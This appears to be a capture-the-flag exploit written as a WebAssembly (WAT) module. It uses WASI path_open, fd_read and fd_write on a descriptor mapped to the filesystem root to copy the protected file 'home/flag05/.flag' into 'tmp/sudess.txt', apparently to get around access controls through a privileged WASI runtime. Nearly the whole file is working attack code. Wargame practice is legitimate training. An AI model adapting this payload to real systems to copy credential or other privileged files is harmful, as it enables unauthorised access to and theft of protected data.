(module
  ;; Import WASI system calls
  (import "wasi_snapshot_preview1" "path_open" 
    (func $wasi_path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_read" 
    (func $wasi_fd_read (param i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_write" 
    (func $wasi_fd_write (param i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_close" 
    (func $wasi_fd_close (param i32) (result i32)))

  ;; Allocate 1 page of linear memory (64KB)
  (memory (export "memory") 1)

  ;; Define static strings in memory (Relative to FD 3, which is mapped to "/")
  (data (i32.const 0) "home/flag05/.flag")   ;; Offset 0: Input filename (17 bytes) [CHANGED]
  (data (i32.const 20) "tmp/sudess.txt")     ;; Offset 20: Output filename (14 bytes)

  ;; Memory Layout Map:
  ;; Offset 36:  Input file descriptor ($fd_in)
  ;; Offset 40:  Output file descriptor ($fd_out)
  ;; Offset 44:  IOV Array (Pointer to buffer at offset 44, Length at offset 48)
  ;; Offset 52:  Number of bytes processed (read/written count)
  ;; Offset 100: File data buffer (temporarily holds text during transfer)

  (func (export "_start")
    (local $fd_in i32)
    (local $fd_out i32)

    ;; 1. Open "home/flag05/.flag" (Read-only) inside FD 3 (Mapped to "/")
    ;; Filename is at offset 0, length 17. Store resulting FD at offset 36. [CHANGED]
    (call $wasi_path_open
      (i32.const 3) (i32.const 0) (i32.const 0) (i32.const 17)
      (i32.const 0) (i64.const 2) (i64.const 2) (i32.const 0) (i32.const 36))
    drop
    (local.set $fd_in (i32.load (i32.const 36)))

    ;; 2. Open/Create "tmp/sudess.txt" (Write-only) inside FD 3 (Mapped to "/")
    ;; Filename is at offset 20, length 14. 
    ;; oflags = 9 (CREAT | TRUNC). Store resulting FD at offset 40.
    (call $wasi_path_open
      (i32.const 3) (i32.const 0) (i32.const 20) (i32.const 14)
      (i32.const 9) (i64.const 64) (i64.const 64) (i32.const 0) (i32.const 40))
    drop
    (local.set $fd_out (i32.load (i32.const 40)))

    ;; 3. Set up the IOV (Input/Output Vector) structure at offset 44
    (i32.store (i32.const 44) (i32.const 100))  ;; IOV.buf: point to data buffer at 100
    (i32.store (i32.const 48) (i32.const 1024)) ;; IOV.buf_len: maximum read size of 1024 bytes

    ;; 4. Read from input file into data buffer, store actual bytes read at offset 52
    (call $wasi_fd_read (local.get $fd_in) (i32.const 44) (i32.const 1) (i32.const 52))
    drop

    ;; 5. Update IOV length at offset 48 to match the exact number of bytes we just read
    (i32.store (i32.const 48) (i32.load (i32.const 52)))

    ;; 6. Write buffer content to the output file, store bytes written at offset 52
    (call $wasi_fd_write (local.get $fd_out) (i32.const 44) (i32.const 1) (i32.const 52))
    drop

    ;; 7. Close file descriptors safely to flush output to disk
    (call $wasi_fd_close (local.get $fd_in)) drop
    (call $wasi_fd_close (local.get $fd_out)) drop
  )
)